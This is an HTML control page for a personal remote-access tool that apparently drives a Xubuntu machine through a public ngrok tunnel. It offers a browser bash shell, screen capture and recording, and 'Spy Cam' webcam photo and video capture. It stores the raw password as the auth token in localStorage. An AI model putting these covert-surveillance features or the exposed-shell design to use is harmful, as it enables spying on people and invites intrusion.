<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <title>Mohit's Command — Responsive</title>

    <!-- xterm + socket.io kept as in your original file -->
    <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css" />
    <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.js"></script>

    <style>
        /* --------------------
       Design system (mobile-first)
       -------------------- */
        :root {
            --bg: #030312;
            /* page background */
            --panel: rgba(8, 10, 12, 0.85);
            --glass: rgba(255, 255, 255, 0.03);
            --primary: #4f46e5;
            /* indigo-600 */
            --accent: #ec4899;
            /* pink-500 */
            --muted: #94a3b8;
            --success: #10b981;
            --danger: #ef4444;
            --text: #e6eef8;
            --card-border: rgba(255, 255, 255, 0.04);

            /* responsive typography */
            --h1: clamp(18px, 3vw, 28px);
            --h2: clamp(16px, 2.4vw, 22px);
            --body: clamp(14px, 2vw, 16px);

            --radius: 12px;
            --gap: 12px;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0
        }

        html,
        body {
            height: 100%
        }

        body {
            background: linear-gradient(180deg, var(--bg) 0%, #05060a 100%);
            color: var(--text);
            -webkit-font-smoothing: antialiased;
            font-family: Inter, 'Segoe UI', system-ui, -apple-system, Roboto, sans-serif;
            padding: 18px;
            /* mobile comfortable padding */
            line-height: 1.35;
            font-size: var(--body);
        }

        /* Layout container: centered & constrained on wide screens */
        .wrap {
            width: 100%;
            max-width: 1180px;
            margin: 0 auto;
        }

        header.appbar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            margin-bottom: 14px;
        }

        .brand {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .brand h1 {
            font-size: var(--h1);
            color: var(--primary);
            letter-spacing: -0.02em
        }

        .brand p {
            font-size: 13px;
            color: var(--muted)
        }

        /* Panels: subtle glass + border + shadow */
        .panel {
            background: linear-gradient(180deg, rgba(255, 255, 255, 0.02), rgba(255, 255, 255, 0.01));
            border-radius: var(--radius);
            padding: 14px;
            border: 1px solid var(--card-border);
            backdrop-filter: blur(6px);
            box-shadow: 0 8px 24px rgba(2, 6, 23, 0.6);
        }

        .controls {
            display: grid;
            grid-template-columns: 1fr;
            gap: 12px
        }

        label.small {
            font-size: 12px;
            color: var(--muted);
            margin-bottom: 6px;
            display: block
        }

        input[type=password],
        input[type=number],
        input[type=text],
        .file-input {
            width: 100%;
            padding: 12px;
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.03);
            background: #051027;
            color: var(--text);
            font-size: var(--body);
        }

        input:focus {
            outline: 2px solid rgba(79, 70, 229, 0.18);
            border-color: rgba(79, 70, 229, 0.35)
        }

        /* Buttons: large tap targets (>=44px) */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 12px 14px;
            border-radius: 10px;
            border: none;
            cursor: pointer;
            font-weight: 600
        }

        .btn.primary {
            background: linear-gradient(90deg, var(--primary), #7c3aed);
            box-shadow: 0 6px 0 rgba(31, 41, 255, 0.12)
        }

        .btn.accent {
            background: linear-gradient(90deg, var(--accent), #db2777)
        }

        .btn.danger {
            background: linear-gradient(90deg, var(--danger), #b91c1c)
        }

        .btn:active {
            transform: translateY(3px)
        }

        .row {
            display: flex;
            gap: 8px
        }

        .row .col {
            flex: 1
        }

        /* Display area (image / video) */
        #display-area {
            display: none;
            margin-top: 10px;
            text-align: center
        }

        #display-area.active {
            display: block
        }

        #display-area img,
        #display-area video {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            border: 1px solid var(--card-border)
        }

        /* Terminal section: make it flexible */
        .terminal-wrapper {
            margin-top: 14px;
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid var(--card-border);
            background: linear-gradient(180deg, rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.45));
        }

        .term-top {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 12px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03)
        }

        .tab-bar {
            display: flex;
            gap: 8px;
            overflow: auto;
            padding: 10px
        }

        .tab {
            padding: 8px 12px;
            border-radius: 8px;
            background: transparent;
            color: var(--muted);
            font-weight: 600;
            flex-shrink: 0;
            border: 1px solid transparent
        }

        .tab.active {
            background: rgba(255, 255, 255, 0.02);
            color: var(--primary);
            border-color: rgba(255, 255, 255, 0.03)
        }

        .xterm-container {
            display: none;
            padding: 10px;
            background: #000
        }

        .xterm-container.active {
            display: block
        }

        /* Virtual keyboard compact on desktop, scrollable on mobile */
        .virtual-kb {
            display: flex;
            gap: 8px;
            padding: 10px;
            overflow: auto
        }

        .vk-key {
            flex-shrink: 0;
            padding: 8px 12px;
            border-radius: 8px;
            background: #0f1724;
            border: 1px solid rgba(255, 255, 255, 0.02);
            min-width: 44px;
            text-align: center
        }

        .vk-key.toggled {
            background: var(--danger)
        }

        /* Login centered card */
        #login-section {
            max-width: 420px;
            margin: 12vh auto
        }

        /* ---- Wide screen layout ---- */
        @media (min-width:900px) {
            body {
                padding: 28px
            }

            header.appbar {
                margin-bottom: 20px
            }

            /* two-column layout: left controls, right terminal */
            .two-col {
                display: grid;
                grid-template-columns: 420px 1fr;
                gap: 18px;
                align-items: start
            }

            .controls {
                grid-template-columns: 1fr
            }

            /* terminal gets larger height on desktop */
            .xterm-container {
                min-height: 480px
            }

            #login-section {
                margin-top: 18vh
            }
        }

        /* ---- Small tweaks for very small phones ---- */
        @media (max-width:360px) {
            .brand h1 {
                font-size: 16px
            }

            .row {
                flex-direction: column
            }
        }

        /* Accessibility focus */
        button:focus,
        a:focus,
        input:focus {
            outline: 3px solid rgba(79, 70, 229, 0.14);
            outline-offset: 2px
        }
    </style>
</head>

<body>
    <div class="wrap">

        <header class="appbar">
            <div class="brand">
                <div
                    style="width:44px;height:44px;border-radius:10px;background:linear-gradient(135deg,var(--primary),#7c3aed);display:flex;align-items:center;justify-content:center;font-weight:700;color:white">
                    M</div>
                <div>
                    <h1>Mohit's Command</h1>
                    <p>Responsive remote terminal — mobile + laptop</p>
                </div>
            </div>
            <div style="display:flex;align-items:center;gap:10px">
                <button class="btn danger" onclick="logout()">Logout</button>
            </div>
        </header>

        <!-- LOGIN -->
        <div id="login-section" class="panel">
            <h2 style="margin-bottom:10px;color:var(--primary)">🔒 Access Terminal</h2>
            <div class="controls">
                <input id="passwordInput" type="password" placeholder="Secret Password..." aria-label="password">
                <button class="btn primary" onclick="login()">Enter System</button>
                <p id="loginError" style="color:var(--danger);text-align:center;font-size:13px"></p>
            </div>
        </div>

        <!-- DASHBOARD -->
        <div id="dashboard" style="display:none">

            <div class="two-col">
                <!-- LEFT CONTROLS -->
                <div class="panel">
                    <h3 style="color:var(--primary);margin-bottom:10px">👀 Vision & Recording</h3>

                    <div class="row" style="margin-bottom:6px">
                        <button class="btn" style="flex:1" onclick="fetchMedia('/api/screenshot','img')">📸
                            Screen</button>
                        <button class="btn" style="flex:1" onclick="fetchMedia('/api/spyphoto','img')">🤫 Spy
                            Cam</button>
                    </div>

                    <div class="row" style="margin-bottom:10px">
                        <div class="col">
                            <label class="small">Screen (sec)</label>
                            <input id="screenTime" type="number" value="10" min="1" max="120">
                        </div>
                        <div class="col">
                            <label class="small">Cam (sec)</label>
                            <input id="camTime" type="number" value="5" min="1" max="30">
                        </div>
                    </div>

                    <div class="row" style="margin-bottom:8px">
                        <button class="btn accent" style="flex:1"
                            onclick="recordMedia('/api/screenrecord','screenTime')">📺 Rec Screen</button>
                        <button class="btn accent" style="flex:1" onclick="recordMedia('/api/spycam','camTime')">🕵️ Rec
                            Cam</button>
                    </div>

                    <hr style="border:none;border-top:1px solid rgba(255,255,255,0.03);margin:12px 0">

                    <h3 style="color:var(--primary);margin-bottom:10px">✨ Magic & Audio</h3>
                    <div class="row" style="margin-bottom:8px">
                        <input id="magicInput" type="text" placeholder="Type magic message...">
                        <button class="btn primary" onclick="castMagic()">🪄</button>
                    </div>

                    <label class="small">Upload audio to play on Xubuntu</label>
                    <input id="audioUpload" class="file-input" type="file" accept="audio/*">
                    <div class="row" style="margin-top:8px">
                        <button class="btn" style="flex:1" onclick="uploadAudio()">🎵 Play</button>
                        <button class="btn danger" style="flex:1" onclick="stopMusic()">🛑 Stop</button>
                    </div>

                    <div id="display-area"></div>

                </div>

                <!-- RIGHT: Terminal -->
                <div class="terminal-wrapper panel">
                    <div class="term-top">
                        <div>
                            <strong style="color:var(--muted)">💻 Xubuntu Shell</strong>
                            <div style="font-size:12px;color:var(--muted)">Multiple tabs • touch-friendly</div>
                        </div>
                        <div style="display:flex;gap:8px;align-items:center">
                            <button class="btn" onclick="createNewTab()">➕ New Tab</button>
                        </div>
                    </div>

                    <div class="tab-bar panel" id="tabBar" aria-label="tab bar">
                        <!-- tabs injected here -->
                    </div>

                    <div id="terminals-area" style="background:#000;padding:10px">
                        <!-- terminal containers injected here -->
                    </div>

                    <div class="virtual-kb" aria-hidden="false">
                        <div style="font-size:12px;color:var(--muted);min-width:44px">VK:</div>
                        <button class="vk-key" id="vk-ctrl" onclick="toggleCtrl()">Ctrl</button>
                        <button class="vk-key" onclick="sendDirectKey('\x03')">Ctrl+C</button>
                        <button class="vk-key" onclick="sendDirectKey('\x1a')">Ctrl+Z</button>
                        <button class="vk-key" onclick="sendDirectKey('\x1b')">Esc</button>
                        <button class="vk-key" onclick="sendDirectKey('\x09')">Tab</button>
                        <button class="vk-key" onclick="sendDirectKey('\x0d')">Enter</button>
                        <button class="vk-key" onclick="forceKillCurrent()"
                            style="min-width:88px;background:#2b0b0b">Kill 🔪</button>
                    </div>

                </div>

            </div>

        </div>

    </div>

    <script>
        // ------- Terminal logic: adapted from your existing code (keeps xterm usage) -------
        let socket;
        let terminals = {};
        let activeTabId = null;
        let tabCount = 0;
        let isCtrlToggled = false;
        /* ---------- Keep your original logic but adapt selectors to new DOM structure ---------- */
        const BASE_URL = "https://awhirl-digestibly-refugio.ngrok-free.dev";
        let currentToken = localStorage.getItem("magic_token");

        // reuse the terminal / socket logic you already had; this file expects your server (/server.js) to remain as-is.

        // show dashboard if token exists
        if (currentToken) showDashboard();

        async function login() {
            const pass = document.getElementById('passwordInput').value;
            try {
                const res = await fetch(`${BASE_URL}/api/login`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true' }, body: JSON.stringify({ password: pass })
                });
                if (res.ok) { currentToken = pass; localStorage.setItem('magic_token', currentToken); showDashboard(); }
                else document.getElementById('loginError').innerText = 'Wrong Password!';
            } catch (e) { document.getElementById('loginError').innerText = 'Server offline!'; }
        }

        function showDashboard() {
            document.getElementById('login-section').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
            initTerminal();
        }

        function logout() { localStorage.removeItem('magic_token'); location.reload(); }

        /* Small helpers (fetchMedia, recordMedia, castMagic, uploadAudio etc.) are identical to your original file.
           To keep this example concise the rest of those functions are intentionally minimal here — paste your
           full implementations from your existing index.html for complete behaviour. */

        async function fetchAPI(endpoint, method = 'GET', body = null) {
            const options = { method, headers: { 'Authorization': currentToken, 'ngrok-skip-browser-warning': 'true' } };
            if (body) { options.headers['Content-Type'] = 'application/json'; options.body = JSON.stringify(body); }
            return fetch(`${BASE_URL}${endpoint}`, options);
        }

        async function fetchMedia(endpoint, type) {
            const area = document.getElementById('display-area'); area.classList.add('active'); area.innerHTML = '<p style="color:var(--muted)">Loading... ⏳</p>';
            const res = await fetchAPI(endpoint);
            if (res.ok) { const url = URL.createObjectURL(await res.blob()); area.innerHTML = `<img src="${url}" />`; }
            else area.innerHTML = '<p style="color:var(--danger)">Failed to load</p>';
        }

        async function recordMedia(endpoint, inputId) {
            const duration = document.getElementById(inputId).value;
            const area = document.getElementById('display-area'); area.classList.add('active'); area.innerHTML = `<p style="color:var(--accent)">Recording for ${duration}s...</p>`;
            const res = await fetchAPI(endpoint, 'POST', { duration });
            if (res.ok) { const url = URL.createObjectURL(await res.blob()); area.innerHTML = `<video src="${url}" controls autoplay playsinline></video>`; }
            else area.innerHTML = '<p style="color:var(--danger)">Recording failed</p>';
        }

        async function castMagic() { const text = document.getElementById('magicInput').value; await fetchAPI('/api/message', 'POST', { text }); document.getElementById('magicInput').value = ''; }
        async function uploadAudio() { const fileInput = document.getElementById('audioUpload'); if (!fileInput.files[0]) return alert('Select audio file'); const formData = new FormData(); formData.append('audioFile', fileInput.files[0]); await fetch(`${BASE_URL}/api/playaudio`, { method: 'POST', headers: { 'Authorization': currentToken, 'ngrok-skip-browser-warning': 'true' }, body: formData }); alert('Music sent!'); }
        async function stopMusic() { await fetchAPI('/api/musicroko', 'POST'); }

        // ------- Terminal logic: adapted from your existing code (keeps xterm usage) -------


        function initTerminal() {
            socket = io(BASE_URL, { auth: { token: currentToken }, extraHeaders: { 'ngrok-skip-browser-warning': 'true' } });

            socket.on('connect', () => {
                for (let id in terminals) terminals[id].xterm.write('\r\n\x1b[32m[Connected!]\x1b[0m\r\n');
            });

            socket.on('terminal-data', ({ tabId, data }) => { if (terminals[tabId]) terminals[tabId].xterm.write(data); });
            socket.on('connect_error', () => alert('Terminal Connection Failed!'));

            createNewTab();
        }

        function createNewTab() {
            tabCount++; const tabId = `s_${tabCount}`;
            const tabBtn = document.createElement('div'); tabBtn.className = 'tab'; tabBtn.id = `tab-btn-${tabId}`; tabBtn.innerHTML = `Bash ${tabCount} <span style="margin-left:8px;cursor:pointer;color:var(--danger)" onclick="closeTab('${tabId}', event)">×</span>`;
            tabBtn.onclick = () => switchTab(tabId);
            document.getElementById('tabBar').appendChild(tabBtn);

            const container = document.createElement('div'); container.className = 'xterm-container'; container.id = `container-${tabId}`;
            document.getElementById('terminals-area').appendChild(container);

            const term = new Terminal({ theme: { background: '#000', foreground: '#e6eef8', cursor: '#4f46e5' }, fontSize: 13 });
            terminals[tabId] = { xterm: term, container, btn: tabBtn };

            switchTab(tabId);
            term.open(container);
            term.write('\x1b[33mEstablishing secure link to Xubuntu...\x1b[0m\r\n\
\x1b[33mKabhi kabhi terminal me -> aisa nishan nhi aata to usko close kro aur new terminal open kro\x1b');

            term.onData((data) => {
                let payload = data;
                if (isCtrlToggled && data.length === 1) {
                    const charCode = data.charCodeAt(0);
                    if (charCode >= 97 && charCode <= 122) payload = String.fromCharCode(charCode - 96);
                    toggleCtrl();
                }
                socket.emit('terminal-input', { tabId, data: payload });
            });

            socket.emit('start-session', tabId);
        }

        function switchTab(tabId) {
            if (activeTabId && terminals[activeTabId]) { terminals[activeTabId].btn.classList.remove('active'); terminals[activeTabId].container.classList.remove('active'); }
            activeTabId = tabId; terminals[tabId].btn.classList.add('active'); terminals[tabId].container.classList.add('active');
        }

        function closeTab(tabId, event) {
            event.stopPropagation(); socket.emit('close-session', tabId); if (terminals[tabId]) { terminals[tabId].btn.remove(); terminals[tabId].container.remove(); try { terminals[tabId].xterm.dispose(); } catch (e) { } delete terminals[tabId]; }
            if (activeTabId === tabId) { const remaining = Object.keys(terminals); if (remaining.length > 0) switchTab(remaining[0]); else activeTabId = null; }
        }

        function toggleCtrl() { isCtrlToggled = !isCtrlToggled; document.getElementById('vk-ctrl').classList.toggle('toggled'); }
        function sendDirectKey(k) { if (activeTabId) socket.emit('terminal-input', { tabId: activeTabId, data: k }); }
        function forceKillCurrent() { if (activeTabId && confirm('Force kill this session?')) { socket.emit('force-kill', activeTabId); setTimeout(() => { closeTab(activeTabId, { stopPropagation: () => { } }); }, 300); } }

    </script>
</body>

</html>
